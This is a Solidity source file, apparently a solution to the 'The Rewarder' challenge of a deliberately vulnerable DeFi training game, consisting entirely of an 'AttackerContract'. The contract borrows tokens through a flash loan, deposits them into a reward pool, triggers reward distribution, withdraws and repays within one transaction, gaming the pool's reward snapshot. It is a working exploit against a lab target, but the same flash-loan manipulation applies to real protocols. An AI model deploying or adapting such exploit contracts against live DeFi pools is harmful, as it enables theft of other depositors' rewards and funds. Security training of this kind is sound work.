// SPDX-License-Identifier: Unidentified

pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function distributeRewards() external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IDamnValuableToken {
    function approve(address spender, uint256 amount) external;

    function transfer(address recipient, uint256 amount) external;
}

contract AttackerContract {
    address public damnValuableToken_addres;
    address public RewarderPool_address;
    address public flashLoanPool_address;

    event Debug(address);

    constructor(
        address dvt_addres,
        address rwp_addres,
        address flp_address
    ) {
        damnValuableToken_addres = dvt_addres;
        RewarderPool_address = rwp_addres;
        flashLoanPool_address = flp_address;
    }

    function attack(uint256 amount) external {
        IFlashLoanerPool(flashLoanPool_address).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        IDamnValuableToken(damnValuableToken_addres).approve(
            RewarderPool_address,
            amount
        );
        IRewarderPool(RewarderPool_address).deposit(amount);
        IRewarderPool(RewarderPool_address).distributeRewards();
        IRewarderPool(RewarderPool_address).withdraw(amount);
        IDamnValuableToken(damnValuableToken_addres).transfer(
            flashLoanPool_address,
            amount
        );
    }
}
